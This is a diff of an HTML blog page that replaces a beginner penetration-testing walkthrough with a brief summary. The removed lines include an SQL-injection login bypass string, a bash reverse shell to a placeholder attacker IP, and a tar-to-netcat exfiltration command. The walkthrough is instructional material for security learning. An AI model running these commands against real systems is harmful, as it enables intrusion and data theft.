@@ -102,7 +102,7 @@
     </nav>
 
     <!-- Main Content -->
-    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
@@ -115,205 +115,21 @@
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- penetration testing, cybersecurity, ethical hacking, nmap, gobuster, exploitdb, kernel exploit, lateral movement, root access, data exfiltration -->
+                <!-- metasploit, red-teaming, exploitation -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<p>Welcome to this educational walkthrough of an offensive security assessment! In this guide, we'll break down a penetration test step-by-step, focusing on how an attacker might gain initial access, escalate their privileges, and achieve their objectives. This is designed for beginners, so we'll explain every step and concept clearly.</p>
-<p>This assessment simulated an attacker targeting an organization's external-facing systems and then moving deeper into the internal network.</p>
-<h2>Objectives of the Assessment:</h2>
+<h1>Offensive Security Assessment</h1>
+<p>A deep-dive penetration test focusing on external assets and internal lateral movement.</p>
+<h2>Objectives:</h2>
 <ul>
-<li><strong>External Foothold</strong>: To gain initial access to the target's network through a publicly accessible service that has a known vulnerability.</li>
-<li><strong>Privilege Escalation</strong>: Once inside, to gain higher-level permissions (like administrator or root access) by exploiting a weakness on the compromised system.</li>
-<li><strong>Data Exfiltration</strong>: To demonstrate the ability to steal sensitive information, simulating a real-world data breach.</li>
+<li><strong>External Foothold</strong>: Gained access via vulnerable public-facing service.</li>
+<li><strong>Privilege Escalation</strong>: Exploited local kernel vulnerability to gain Root access.</li>
+<li><strong>Data Exfiltration</strong>: Successfully simulated the removal of sensitive diagnostic data.</li>
 </ul>
-<hr />
-<h2>Reconnaissance</h2>
-<p>The first phase of any security assessment is reconnaissance, where we gather as much information as possible about the target without actively probing it too much. This is like a spy doing their homework before a mission.</p>
-<h3>Port Scanning with Nmap</h3>
-<p>Our first step was to scan the target's IP address to see which ports are open and what services are running on them. The <code>nmap</code> tool is our go-to for this.</p>
-<pre class="codehilite"><code class="language-bash">nmap -sC -sV -oN nmap_scan.txt 10.10.10.10
-</code></pre>
-
-<p><strong>🧠 Beginner Analysis</strong></p>
-<ul>
-<li><strong><code>nmap</code></strong>: This is the Network Mapper, a powerful tool for discovering hosts and services on a computer network.</li>
-<li><strong><code>-sC</code></strong>: This flag tells Nmap to run the default set of Nmap Scripting Engine (NSE) scripts. These scripts can detect a wide range of vulnerabilities and gather more detailed information about services.</li>
-<li><strong><code>-sV</code></strong>: This flag enables version detection. Nmap will try to determine the exact version of the service running on each open port (e.g., Apache 2.4.41, OpenSSH 8.2p1). Knowing the version is crucial because specific versions often have known vulnerabilities.</li>
-<li><strong><code>-oN nmap_scan.txt</code></strong>: This tells Nmap to save the output in a "normal" format to a file named <code>nmap_scan.txt</code>. This is good practice for keeping records of our scans.</li>
-<li><strong><code>10.10.10.10</code></strong>: This is the IP address of the target machine we are scanning.</li>
-</ul>
-<p><strong>Interpreting the Results:</strong></p>
-<p>Let's imagine our Nmap scan returned something like this:</p>
-<pre class="codehilite"><code>PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-</code></pre>
-
-<ul>
-<li>
-<p><strong><code>PORT STATE SERVICE VERSION</code></strong>: These are the columns Nmap provides.</p>
-<ul>
-<li><strong><code>PORT</code></strong>: The port number and protocol (e.g., <code>22/tcp</code>).</li>
-<li><strong><code>STATE</code></strong>: Whether the port is <code>open</code>, <code>closed</code>, or <code>filtered</code>. An <code>open</code> port means a service is actively listening for connections.</li>
-<li><strong><code>SERVICE</code></strong>: The service Nmap thinks is running on that port, based on common port numbers or its script detections.</li>
-<li><strong><code>VERSION</code></strong>: The specific version of the service.</li>
-</ul>
-</li>
-<li>
-<p><strong><code>22/tcp open ssh OpenSSH 8.2p1...</code></strong>: This tells us that port 22, commonly used for Secure Shell (SSH), is open and running OpenSSH version 8.2p1 on an Ubuntu system. SSH is used for secure remote login, and while it's generally secure, vulnerabilities can exist in specific versions or configurations.</p>
-</li>
-<li><strong><code>80/tcp open http Apache httpd 2.4.41...</code></strong>: This indicates that port 80, the standard port for HTTP (web servers), is open and running Apache version 2.4.41 on Ubuntu. Web servers are a very common attack vector because they are directly exposed to the internet and can host web applications that might have vulnerabilities.</li>
-</ul>
-<p><strong>Why is this interesting?</strong></p>
-<p>An open web server on port 80 is a prime target. We need to investigate what website is being hosted there and if there are any known vulnerabilities associated with Apache 2.4.41 or the specific web application.</p>
-<hr />
-<h2>Enumeration</h2>
-<p>After reconnaissance, we move to enumeration. This is where we actively probe the discovered services to gather more detailed information, looking for specific weaknesses.</p>
-<h3>Web Directory Brute-forcing with Gobuster</h3>
-<p>Since we found a web server on port 80, the next logical step is to see what files and directories are hidden on that web server. Many web servers don't expose all their directories publicly. We use a tool called <code>gobuster</code> to try and find them.</p>
-<pre class="codehilite"><code class="language-bash">gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
-</code></pre>
-
-<p><strong>🧠 Beginner Analysis</strong></p>
-<ul>
-<li><strong><code>gobuster</code></strong>: A fast directory and file enumeration tool for web servers.</li>
-<li><strong><code>dir</code></strong>: This subcommand tells <code>gobuster</code> we are looking for directories and files.</li>
-<li><strong><code>-u http://10.10.10.10</code></strong>: Specifies the target URL.</li>
-<li><strong><code>-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></strong>: This points to a wordlist file. A wordlist is a collection of common directory and file names (like "admin", "login", "backup", "config"). <code>gobuster</code> will try each of these names, appending them to the target URL, to see if they exist. Using a "medium" sized list is a good balance between speed and thoroughness for initial scans.</li>
-<li><strong><code>-x php,html,txt</code></strong>: This tells <code>gobuster</code> to append common file extensions to the directory names. So, it will not only look for <code>/admin</code> but also <code>/admin.php</code>, <code>/admin.html</code>, <code>/admin.txt</code>, etc.</li>
-</ul>
-<p><strong>Interpreting the Results:</strong></p>
-<p>Imagine <code>gobuster</code> finds a hidden directory:</p>
-<pre class="codehilite"><code>/admin           (Status: 200)
-/backup          (Status: 200)
-/config.php      (Status: 200)
-</code></pre>
-
-<ul>
-<li><strong><code>/admin (Status: 200)</code></strong>: This means a directory named "admin" exists on the web server, and a <code>200 OK</code> status code indicates it was found successfully. An "admin" panel is a common place for attackers to look for login forms or management interfaces.</li>
-<li><strong><code>/backup (Status: 200)</code></strong>: A backup directory might contain sensitive files or configurations that were not meant to be public.</li>
-<li><strong><code>/config.php (Status: 200)</code></strong>: This is a PHP configuration file. If it's accessible, it might contain database credentials, API keys, or other sensitive information.</li>
-</ul>
-<p>In this scenario, we would navigate our browser to <code>http://10.10.10.10/admin</code>. Let's say we find a login page.</p>
-<hr />
-<h2>Exploitation</h2>
-<p>Now that we've found potential weaknesses, it's time to exploit them to gain access.</p>
-<h3>Exploiting a Web Application Vulnerability</h3>
-<p>Continuing from the web enumeration, let's say we discover that the web application on <code>http://10.10.10.10/</code> is vulnerable to <strong>SQL Injection</strong>.</p>
-<p><strong>What is SQL Injection?</strong></p>
-<p>SQL Injection (SQLi) is a type of vulnerability where an attacker can interfere with the queries that an application makes to its database. By inserting malicious SQL code into input fields, an attacker can trick the database into revealing sensitive data, modifying data, or even executing commands on the underlying operating system.</p>
-<p>We might find a login form where entering <code>' OR '1'='1</code> in the username field bypasses authentication.</p>
-<p>Once authenticated or if we found a vulnerability that gives us direct command execution, we might upload a <strong>reverse shell</strong>.</p>
-<p><strong>What is a Reverse Shell?</strong></p>
-<p>Normally, when you connect to a server using SSH or telnet, you initiate the connection <em>from your machine</em> to the <em>server</em>. This is called a "bind shell" because the service is "bound" to a port on the server.</p>
-<p>A "reverse shell" is the opposite. The compromised server <em>initiates a connection back</em> to our attacker machine. This is often used to bypass firewalls that might block incoming connections but allow outgoing ones.</p>
-<p><strong>Example Scenario:</strong></p>
-<p>Suppose we exploited a file upload vulnerability in the web application. We could upload a simple PHP script that executes a reverse shell command.</p>
-<p>On our attacker machine, we would set up a listener:</p>
-<pre class="codehilite"><code class="language-bash">nc -lvnp 4444
-</code></pre>
-
-<p><strong>🧠 Beginner Analysis</strong></p>
-<ul>
-<li><strong><code>nc</code></strong>: This is Netcat, often called the "Swiss Army knife" for TCP/IP. It can be used to read and write data across network connections.</li>
-<li><strong><code>-l</code></strong>: Listen mode. <code>nc</code> will wait for an incoming connection.</li>
-<li><strong><code>-v</code></strong>: Verbose mode. Provides more detailed output about the connection.</li>
-<li><strong><code>-n</code></strong>: Numeric-only IP addresses, don't resolve hostnames.</li>
-<li><strong><code>-p 4444</code></strong>: The port number to listen on. We choose an arbitrary port (4444) that is not typically used by critical services.</li>
-</ul>
-<p>Then, on the compromised server via the web shell, we'd execute a command like this (depending on the server's OS):</p>
-<pre class="codehilite"><code class="language-bash"># Example for Linux
-bash -i &gt;&amp; /dev/tcp/OUR_ATTACKER_IP/4444 0&gt;&amp;1
-</code></pre>
-
-<p><strong>Interpreting the Results:</strong></p>
-<p>When the reverse shell command runs on the target, it will attempt to connect back to our listening <code>nc</code> instance on <code>OUR_ATTACKER_IP:4444</code>. If successful, our <code>nc</code> terminal will show a connection, and we'll have a command prompt on the target machine!</p>
-<pre class="codehilite"><code>listening on [any] 4444 ...
-connect to [10.10.10.5] from (UNKNOWN) [10.10.10.10] 54321
-</code></pre>
-
-<p>This <code>connect to...</code> line means the target machine (10.10.10.10) has successfully connected back to our attacker machine (10.10.10.5) on port 4444. We now have a shell!</p>
-<hr />
-<h2>Privilege Escalation</h2>
-<p>Having a shell is great, but usually, it's with limited permissions (a "low-privilege" user). To achieve objectives like data exfiltration, we often need higher privileges, such as root (on Linux) or Administrator (on Windows). This is called Privilege Escalation.</p>
-<h3>Exploiting a Local Kernel Vulnerability</h3>
-<p>We've gained a shell as a low-privileged user. Now, we need to find a way to become the "root" user. A common method is to find a vulnerability in the operating system's kernel. The kernel is the core of the operating system, and if it has a bug, we can sometimes use that bug to gain full control.</p>
-<p>We would typically use a script like <code>linpeas.sh</code> or manually check for:</p>
-<ol>
-<li><strong>Kernel Version</strong>: Is it an old, known-vulnerable version?</li>
-<li><strong>SUID Binaries</strong>: Are there any executables that run with the permissions of the owner (often root), even when run by a regular user?</li>
-<li><strong>Misconfigured Services</strong>: Are there services running as root that can be manipulated?</li>
-</ol>
-<p><strong>What is SUID?</strong></p>
-<p>SUID (Set User ID) is a special permission bit on Linux/Unix systems. When an executable file has the SUID bit set and is owned by root, running that executable will grant the user who ran it the privileges of the owner (root) for the duration of that execution. For example, if <code>/usr/bin/find</code> was vulnerable and had SUID set for root, a regular user could use it to execute commands as root.</p>
-<p>Let's assume we found an outdated kernel version and searched for exploits for it on exploit-db.com. We might find a public exploit, download it to the target machine (often by transferring it via <code>wget</code> or using our existing reverse shell), and compile it.</p>
-<p>For example, a kernel exploit might be run like this:</p>
-<pre class="codehilite"><code class="language-bash">./exploit_name
-</code></pre>
-
-<p><strong>🧠 Beginner Analysis</strong></p>
-<ul>
-<li><strong><code>./exploit_name</code></strong>: This command executes a program named <code>exploit_name</code> from the current directory (<code>.</code>).</li>
-<li><strong>Kernel Exploits</strong>: These are programs specifically designed to leverage bugs in the operating system's kernel. They are often complex and require precise execution.</li>
-</ul>
-<p><strong>Interpreting the Results:</strong></p>
-<p>If the kernel exploit is successful, it will typically spawn a new shell with root privileges.</p>
-<pre class="codehilite"><code class="language-bash"># whoami
-root
-# id
-uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-
-<ul>
-<li><strong><code>whoami</code></strong>: This command shows the current username. Seeing <code>root</code> confirms we have escalated our privileges.</li>
-<li><strong><code>id</code></strong>: This command shows the user ID (UID) and group ID (GID). <code>uid=0</code> is the standard UID for the root user on Linux systems.</li>
-</ul>
-<p>We have now achieved root access on the compromised system!</p>
-<hr />
-<h2>Data Exfiltration</h2>
-<p>Our final objective was to simulate the exfiltration of sensitive diagnostic data. With root privileges, we have access to almost anything on the system.</p>
-<h3>Locating and Transferring Data</h3>
-<p>We would now search for sensitive files. In a real scenario, this could be database dumps, configuration files containing credentials, customer data, or internal project documents. For this simulation, let's assume we found a directory with diagnostic logs containing valuable information.</p>
-<p>We might find the data at <code>/var/log/diagnostics/</code>. To exfiltrate it, we could use <code>scp</code> (Secure Copy) if we had SSH access from our attacker machine to the target, or if the target has an outbound connection to a server we control.</p>
-<p>A common method is to compress the data and then serve it over a simple HTTP server from the compromised machine, or use <code>nc</code> to pipe it directly.</p>
-<p><strong>Example using Netcat for Exfiltration:</strong></p>
-<ol>
-<li>
-<p><strong>On the Target Machine (as root):</strong><br />
-    We can create a compressed archive of the sensitive data and then pipe it into <code>nc</code> to send it to our attacker machine.</p>
-<p><code>bash
-tar -czvf - /var/log/diagnostics | nc OUR_ATTACKER_IP 5555</code></p>
-<ul>
-<li><strong><code>tar -czvf - /var/log/diagnostics</code></strong>: This command creates a compressed archive (<code>-c</code>, <code>-z</code> for gzip, <code>-v</code> for verbose, <code>-f -</code> to output to standard output).</li>
-<li><strong><code>|</code></strong>: The pipe symbol sends the output of the <code>tar</code> command as input to the <code>nc</code> command.</li>
-<li><strong><code>nc OUR_ATTACKER_IP 5555</code></strong>: Connects to our attacker machine's IP address on port 5555 and sends the data.</li>
-</ul>
-</li>
-<li>
-<p><strong>On the Attacker Machine:</strong><br />
-    We listen on the specified port and redirect the incoming data to a file.</p>
-<p><code>bash
-nc -lvnp 5555 &gt; sensitive_data.tar.gz</code></p>
-<ul>
-<li><strong><code>nc -lvnp 5555</code></strong>: Listens on port 5555.</li>
-<li><strong><code>&gt; sensitive_data.tar.gz</code></strong>: Redirects all incoming data to a file named <code>sensitive_data.tar.gz</code>.</li>
-</ul>
-</li>
-</ol>
-<p><strong>🧠 Beginner Analysis</strong></p>
-<ul>
-<li><strong><code>tar</code></strong>: A common utility used to bundle multiple files into a single archive file (often called a tarball). The options used (<code>-czvf</code>) compress the archive using gzip (<code>-z</code>).</li>
-<li><strong>Piping (<code>|</code>)</strong>: This is a fundamental concept in command-line interfaces. It allows the output of one command to be used as the input of another command.</li>
-<li><strong><code>nc</code> for Data Transfer</strong>: As seen before, Netcat is incredibly versatile. Here, it's used not just for shells, but for raw data transfer. By listening (<code>-l</code>) on a port, it accepts incoming data and saves it to a file.</li>
-</ul>
-<p><strong>Interpreting the Results:</strong></p>
-<p>Once the transfer is complete, we will have a file named <code>sensitive_data.tar.gz</code> on our attacker machine. We can then extract it to verify that we have successfully exfiltrated the simulated sensitive diagnostic data.</p>
-<hr />
-<p>This walkthrough demonstrates a typical penetration testing methodology, from initial discovery to achieving advanced objectives. Remember, the key to offensive security is understanding how systems work, where common vulnerabilities lie, and how to leverage tools to find and exploit them ethically and legally.</p>
         </div>
     </main>
 
